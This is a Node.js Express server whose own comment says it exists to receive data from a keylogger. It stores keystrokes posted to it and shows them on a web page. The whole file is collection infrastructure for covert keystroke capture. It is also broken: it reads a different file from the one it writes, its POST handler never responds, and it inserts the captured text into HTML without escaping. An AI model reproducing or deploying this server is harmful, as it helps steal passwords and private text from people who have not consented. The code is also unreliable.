// Express server to listen to keylogger

const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// Create express app
const app = express();

app.use(bodyParser.json());

const port = 8080;

// Endpoint to display keystroke data
app.get("/", (req, res) => {
    try {
        const klFile = fs.readFileSync("./keyboard_capture.txt", "utf8");
        res.send(`<h1>Logging keystroke data</h1><p>${klFile.replace(/\n/g, "<br>")}</p>`);
    } catch (error) {
        res.send("<h1>Nothing has happened yet...</h1>");
    }
});

// Endpoint to log keystroke data
app.post("/", (req, res) => {
    const { keyboardData } = req.body;
    console.log(keyboardData);

    fs.writeFileSync("keyboard_log.txt", keyboardData, (err) => {
        if (err) {
            console.error("Error writing to file", err);
            res.status(500).send("Error saving data.");
            return;
        }
        res.send("Dope! Data is set correctly!");
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
